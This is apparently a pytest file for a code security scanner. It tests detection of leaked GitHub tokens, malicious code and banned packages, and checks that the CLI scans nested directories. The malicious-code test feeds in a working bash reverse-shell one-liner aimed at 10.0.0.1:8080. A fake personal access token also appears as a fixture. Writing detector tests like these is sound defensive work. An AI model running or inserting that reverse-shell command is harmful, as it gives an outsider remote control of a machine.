from analysis.secret_scanner import scan_for_secrets
from analysis.malicious_scanner import scan_for_malicious
from analysis.sca_scanner import scan_for_sca
from cli import main as cli_main

def test_secret_scanner_finds_github_pat(mock_diff_chunk):
    chunk = mock_diff_chunk(
        added_lines=["export GITHUB_TOKEN=ghp_123456789012345678901234567890123456"]
    )
    findings = scan_for_secrets(chunk)
    assert len(findings) > 0
    assert "CRITICAL" in findings[0]
    assert "GitHub Personal Access Token" in findings[0]

def test_secret_scanner_ignores_safe_line(mock_diff_chunk):
    chunk = mock_diff_chunk(
        added_lines=["print('This is a safe line')"]
    )
    findings = scan_for_secrets(chunk)
    assert len(findings) == 0

def test_malicious_scanner_finds_reverse_shell(mock_diff_chunk):
    # This depends on malicious_compliance.json having a rule for /bin/bash -i or similar
    chunk = mock_diff_chunk(
        file_path="script.sh",
        added_lines=["bash -i >& /dev/tcp/10.0.0.1/8080 0>&1"]
    )
    findings = scan_for_malicious(chunk)
    assert len(findings) > 0

def test_sca_scanner_finds_banned_package(mock_diff_chunk):
    # This depends on sca_compliance.json having rules
    chunk = mock_diff_chunk(
        file_path="requirements.txt",
        content="requests==2.25.1\ntelnetlib3==1.0.1"
    )
    # Note: sca_scanner uses chunk.content for manifest files
    findings = scan_for_sca(chunk)
    # We'll assume telnetlib3 or similar is in the compliance file
    # If not, this test might need adjustment based on sca_compliance.json content
    assert isinstance(findings, list)


def test_run_pipeline_recurses_into_subdirectories(tmp_path, monkeypatch):
    nested_dir = tmp_path / "nested" / "deep"
    nested_dir.mkdir(parents=True)

    top_file = tmp_path / "top.txt"
    nested_file = nested_dir / "deep.txt"
    top_file.write_text("print('safe')\n", encoding="utf-8")
    nested_file.write_text("print('also safe')\n", encoding="utf-8")

    seen_paths = []

    def fake_filter_chunks(chunks):
        return chunks

    def fake_scan_for_secrets(chunk):
        seen_paths.append(chunk.file_path)
        return []

    monkeypatch.setattr(cli_main, "filter_chunks", fake_filter_chunks)
    monkeypatch.setattr(cli_main, "filter_chunks_for_secrets", fake_filter_chunks)
    monkeypatch.setattr(cli_main, "filter_chunks_for_sca", fake_filter_chunks)
    monkeypatch.setattr(cli_main, "filter_chunks_for_container", fake_filter_chunks)
    monkeypatch.setattr(cli_main, "filter_chunks_for_iac", fake_filter_chunks)
    monkeypatch.setattr(cli_main, "filter_chunks_for_malicious", fake_filter_chunks)

    monkeypatch.setattr(cli_main, "scan_for_secrets", fake_scan_for_secrets)
    monkeypatch.setattr(cli_main, "scan_for_sca", lambda chunk: [])
    monkeypatch.setattr(cli_main, "scan_for_container", lambda chunk: [])
    monkeypatch.setattr(cli_main, "scan_for_iac", lambda chunk: [])
    monkeypatch.setattr(cli_main, "scan_for_malicious", lambda chunk: [])
    monkeypatch.setattr(cli_main, "scan_python", lambda content: [])
    monkeypatch.setattr(cli_main, "compute_score", lambda findings: (0, "PASS"))
    monkeypatch.setattr(cli_main, "generate_github_summary", lambda *args, **kwargs: None)
    monkeypatch.setattr(cli_main, "generate_html_report", lambda *args, **kwargs: None)

    result = cli_main.run_pipeline(target=str(tmp_path))

    assert result == "PASS"
    assert str(nested_file) in seen_paths
